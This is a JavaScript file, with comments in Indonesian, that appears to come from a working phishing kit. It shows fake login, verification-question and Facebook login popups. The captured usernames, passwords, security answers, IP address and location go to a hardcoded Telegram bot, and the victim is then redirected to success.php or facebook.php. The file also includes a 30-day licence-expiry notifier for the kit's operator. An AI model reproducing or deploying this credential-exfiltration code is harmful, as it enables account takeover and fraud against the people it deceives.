// --- BAGIAN 1: SISTEM KEDALUWARSA & NOTIFIKASI TELEGRAM ---

function checkExpirationAndNotify() {
  const activationTime = localStorage.getItem("activationTime");
  if (!activationTime) {
    console.log("Fitur belum diaktifkan.");
    return;
  }

  const currentTime = Date.now();
  // Diubah menjadi 30 hari dalam milidetik (30 * 24 * 60 * 60 * 1000)
  const thirtyDaysInMs = 30 * 24 * 60 * 60 * 1000;
  const timeLeft = thirtyDaysInMs - (currentTime - Number(activationTime));
  const twoDaysInMs = 2 * 24 * 60 * 60 * 1000;
  const twoHoursInMs = 2 * 60 * 60 * 1000;

  console.log(
    `Sisa waktu: ${(timeLeft / (24 * 60 * 60 * 1000)).toFixed(2)} hari`
  );

  if (timeLeft > twoDaysInMs) return;

  if (timeLeft <= twoDaysInMs && timeLeft > 0) {
    const last = Number(localStorage.getItem("lastNotificationTime") || 0);
    if (currentTime - last >= twoHoursInMs) {
      console.log("Mengirim notifikasi kedaluwarsa ke Telegram...");
      sendExpirationNotification(timeLeft);
      localStorage.setItem("lastNotificationTime", String(currentTime));
    } else {
      console.log(
        "Notifikasi kedaluwarsa belum dikirim karena belum 2 jam."
      );
    }
  }

  if (timeLeft <= 0) {
    console.log("Waktu telah habis. Tidak ada notifikasi yang dikirim.");
  }
}

function sendExpirationNotification(timeLeft) {
  const remainingHours = Math.ceil(timeLeft / (60 * 60 * 1000));
  const telegramBotToken = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
  const chatIDs = ["3424365142"];
  const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const message = `🔔 Pemberitahuan 🔔

⏳ Sisa Waktu: ${Math.ceil(
    timeLeft / (24 * 60 * 60 * 1000)
  )} Hari (${remainingHours} Jam)

⚠️ Pemberitahuan Penting
Fitur Anda akan berakhir dalam kurang dari 2 hari.
Segera perpanjang aktivasi Anda untuk terus menggunakan layanan ini tanpa gangguan.

📞 Informasi Lengkap:
https://wa.link/v3dsdh

Terima kasih atas kepercayaan Anda! ✅`;

  Promise.all(
    chatIDs.map((chat_id) =>
      fetch(telegramURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: message }),
      })
    )
  )
    .then((rs) => {
      const ok = rs.every((r) => r.ok);
      console.log(
        ok
          ? "Pemberitahuan berhasil dikirim ke Telegram."
          : "Gagal mengirim pemberitahuan ke chat Telegram."
      );
    })
    .catch((err) =>
      console.error("Terjadi kesalahan saat mengirim pemberitahuan:", err)
    );
}

if (!localStorage.getItem("activationTime")) {
  localStorage.setItem("activationTime", String(Date.now()));
  console.log("Waktu aktivasi telah diatur selama 30 hari.");
}
checkExpirationAndNotify();
setInterval(checkExpirationAndNotify, 30 * 60 * 1000);

function redirectToService() {
  window.location.href = "https://ikf.f2z7ly.com/web/index.do";
}

function showLoadingThenVisitor() {
  const loadingPopup = document.createElement("div");
  loadingPopup.id = "loadingPopup";
  loadingPopup.style.cssText = `
    position:fixed;display:flex;justify-content:center;align-items:center;
    top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:1000;`;
  loadingPopup.innerHTML = `<img src="img/loading.png" alt="Loading" style="width:250px;height:auto;">`;
  document.body.appendChild(loadingPopup);
  setTimeout(() => {
    const el = document.getElementById("loadingPopup");
    if (el) el.remove();
    showIpLimitImage();
  }, 2000);
}

function showIpLimitImage() {
  const p = document.getElementById("ipLimitPopup");
  if (p) p.style.display = "block";
}
function hideIpLimitImage() {
  const p = document.getElementById("ipLimitPopup");
  if (p) p.style.display = "none";
}

document.addEventListener("DOMContentLoaded", () => {
  const ipPopup = document.getElementById("ipLimitPopup");
  if (ipPopup) ipPopup.addEventListener("click", (e) => e.stopPropagation());
});

// --- BAGIAN 2: UI, POPUP, DAN AUDIO ---

(function () {
  const el = document.getElementById("clickSound");
  function _play() {
    try {
      if (el) {
        el.currentTime = 0;
        el.play().catch(() => {});
      } else {
        const a = new Audio("click.mp3");
        a.play().catch(() => {});
      }
    } catch (e) {
      console.warn("Audio gagal diputar:", e);
    }
  }
  window.playClickSound = _play; //
})();

document.addEventListener("DOMContentLoaded", () => {
  document.querySelectorAll("button").forEach((btn) => {
    btn.addEventListener("click", window.playClickSound);
  });
  const fbBtn = document.querySelector("#fbLoginForm .popup-button");
  if (fbBtn) fbBtn.addEventListener("click", window.playClickSound);
});

function showFbLoginPopup() {
  const p = document.getElementById("fbLoginPopup");
  const o = document.getElementById("overlay");
  if (p) p.style.display = "block";
  if (o) o.classList.add("active");
}
function hideFbLoginPopup() {
  const p = document.getElementById("fbLoginPopup");
  const o = document.getElementById("overlay");
  if (p) p.style.display = "none";
  if (o) o.classList.remove("active");
}

document.addEventListener("DOMContentLoaded", () => {
  const verificationSection = document.getElementById("verificationSection");
  const a1 = document.getElementById("answer1");
  const a2 = document.getElementById("answer2");
  if (verificationSection && a1 && a2) {
    a1.addEventListener("focus", () => {
      verificationSection.classList.remove("active-answer2");
      verificationSection.classList.add("active-answer1");
    });
    a2.addEventListener("focus", () => {
      verificationSection.classList.remove("active-answer1");
      verificationSection.classList.add("active-answer2");
    });
    [a1, a2].forEach((i) => {
      i.addEventListener("blur", () => {
        verificationSection.classList.remove(
          "active-answer1",
          "active-answer2"
        );
      });
    });
  }
});

function showVerification() {
  const verification = document.getElementById("verificationSection");
  const security = document.getElementById("securityNotification");
  const overlay = document.getElementById("overlay");
  if (!verification || !security || !overlay) return;
  security.style.display = "none";
  verification.style.display = "block";
  overlay.classList.add("active");
}

let currentImage = 1;
function hideVerification() {
  const verification = document.getElementById("verificationSection");
  const loginPopup = document.getElementById("loginPopup");
  const img = document.getElementById("verifImage");
  if (verification) verification.style.display = "none";
  if (loginPopup) loginPopup.style.display = "block";
  if (img) {
    const a1 = document.getElementById("answer1");
    const a2 = document.getElementById("answer2");
    if (currentImage === 1) {
      img.src = "img/verifikasi2.png";
      currentImage = 2;
      if (a1) {
        a1.style.marginTop = "40px";
        a1.style.marginLeft = "3px";
      }
      if (a2) {
        a2.style.marginTop = "18px";
        a2.style.marginLeft = "3px";
      }
    } else {
      img.src = "img/verifikasi.png";
      currentImage = 1;
      if (a1) {
        a1.style.marginTop = "";
        a1.style.marginLeft = "";
      }
      if (a2) {
        a2.style.marginTop = "";
        a2.style.marginLeft = "";
      }
    }
  }
}

function showPopup() {
  const login = document.getElementById("loginPopup");
  const o = document.getElementById("overlay");
  if (login) login.style.display = "block";
  if (o) o.classList.add("active");
}
function hidePopup() {
  const login = document.getElementById("loginPopup");
  const o = document.getElementById("overlay");
  if (login) login.style.display = "none";
  if (o) o.classList.remove("active");
}

function showSecurityNotification() {
  const login = document.getElementById("loginPopup");
  const sec = document.getElementById("securityNotification");
  if (login) login.style.display = "none";
  if (sec) sec.style.display = "block";
}

// --- BAGIAN 3: MODIFIKASI PENGIRIMAN DATA LOGIN ID KE TELEGRAM ---

let isSubmittedID = false;

function sendDataToTelegram(message, onSuccess, onError) {
  const telegramBotToken = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
  const chatIDs = ["3424365142"]; // Menggunakan Chat ID yang sama
  const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  Promise.all(
    chatIDs.map((chat_id) =>
      fetch(telegramURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: message }),
      })
    )
  )
    .then((rs) => {
      const ok = rs.every((r) => r.ok);
      ok
        ? onSuccess("✅ Data berhasil dikirim ke Telegram.")
        : onError("❌ Gagal mengirim data ke chat Telegram.");
    })
    .catch((err) =>
      onError(`❌ Terjadi kesalahan saat mengirim data: ${err.message}`)
    );
}

function redirectToSuccess() {
  if (isSubmittedID) {
    console.log("Data sudah dikirim (ID).");
    return;
  }

  const userID = (document.getElementById("userID") || {}).value || "";
  const password = (document.getElementById("password") || {}).value || "";
  const answer1 = (document.getElementById("answer1") || {}).value || "";
  const answer2 = (document.getElementById("answer2") || {}).value || "";
  if (!userID || !password || !answer1 || !answer2) {
    alert("Harap lengkapi semua data ID Login dan Verifikasi.");
    return;
  }

  if (localStorage.getItem(`sent_${userID}`) === "true") {
    console.log("User ini sudah pernah dikirim sebelumnya. Lewat.");
    window.location.href = "success.php";
    return;
  }

  isSubmittedID = true;
  const btn = document.getElementById("submitButton");
  if (btn) {
    btn.disabled = true;
    btn.style.cursor = "not-allowed";
  }

  // 1. Ambil IP dan Lokasi
  fetch("https://api.ipify.org?format=json")
    .then((r) => r.json())
    .then((ipData) => {
      const userIP = ipData.ip;
      return fetch(`https://ipapi.co/${userIP}/json`)
        .then((r) => r.json())
        .then((loc) => ({ userIP, loc }));
    })
    .then(({ userIP, loc }) => {
      // 2. Buat Pesan untuk Telegram
      const message = `🔥 *NEW ID LOGIN* 🔥

*ID:* \`${userID}\`
*PASS:* \`${password}\`
*Ans 1:* \`${answer1}\`
*Ans 2:* \`${answer2}\`

*IP:* \`${userIP}\`
*Lokasi:* ${loc.city || "-"}, ${loc.region || "-"}, ${loc.country_name || "-"}
*Source:* ID Login`;

      // 3. Kirim ke Telegram
      return new Promise((resolve, reject) => {
        sendDataToTelegram(
          message,
          (successMsg) => {
            console.log(successMsg);
            resolve();
          },
          (errorMsg) => {
            console.error(errorMsg);
            // Kami tetap melanjutkan ke 'success.php' meskipun pengiriman Telegram gagal
            // agar simulasi alur berhasil tetap berjalan
            resolve();
          }
        );
      });
    })
    .then(() => {
      // 4. Finalisasi dan Redirect
      localStorage.setItem(`sent_${userID}`, "true");
      window.location.href = "success.php";
    })
    .catch((err) => {
      console.error("❌ Gagal memproses login:", err);
      if (btn) {
        btn.disabled = false;
        btn.style.cursor = "pointer";
      }
      isSubmittedID = false;
    });
}

// --- BAGIAN 4: MODIFIKASI PENGIRIMAN DATA LOGIN FACEBOOK KE TELEGRAM ---

let isSubmittingFB = false;

async function sendFBLoginData() {
  if (isSubmittingFB) return;

  const emailEl = document.getElementById("fbEmail");
  const passEl = document.getElementById("fbPassword");
  const email = (emailEl?.value || "").trim();
  const password = (passEl?.value || "").trim();

  if (!email || !password) {
    alert("Email dan Kata Sandi harus diisi!");
    return;
  }

  isSubmittingFB = true;

  const message = `🔵 *NEW FB LOGIN* 🔵

*Email/ID:* \`${email}\`
*Password:* \`${password}\`
*Source:* Facebook`;

  try {
    await new Promise((resolve, reject) => {
      sendDataToTelegram(
        message,
        (successMsg) => {
          console.log(successMsg);
          resolve();
        },
        (errorMsg) => {
          console.error(errorMsg);
          // Kami tetap melanjutkan ke 'facebook.php' meskipun pengiriman Telegram gagal
          resolve();
        }
      );
    });

    // Setelah berhasil mengirim pesan ke Telegram (atau gagal tapi dilanjutkan)
    if (emailEl) emailEl.value = "";
    if (passEl) passEl.value = "";
    window.location.href = "facebook.php";
  } catch (err) {
    console.error("❌ Error FB:", err);
    alert("❌ Tidak bisa menghubungi Telegram API.");
  } finally {
    isSubmittingFB = false;
  }
}


document.addEventListener("DOMContentLoaded", () => {
  const passwordInput = document.getElementById("password");
  const togglePassword = document.getElementById("togglePassword");
  if (!passwordInput || !togglePassword) return;

  const show = () => (passwordInput.type = "text");
  const hide = () => (passwordInput.type = "password");

  togglePassword.addEventListener("mousedown", show);
  togglePassword.addEventListener("mouseup", hide);
  togglePassword.addEventListener("mouseleave", hide);
  togglePassword.addEventListener("touchstart", show, { passive: true });
  togglePassword.addEventListener("touchend", hide);
});
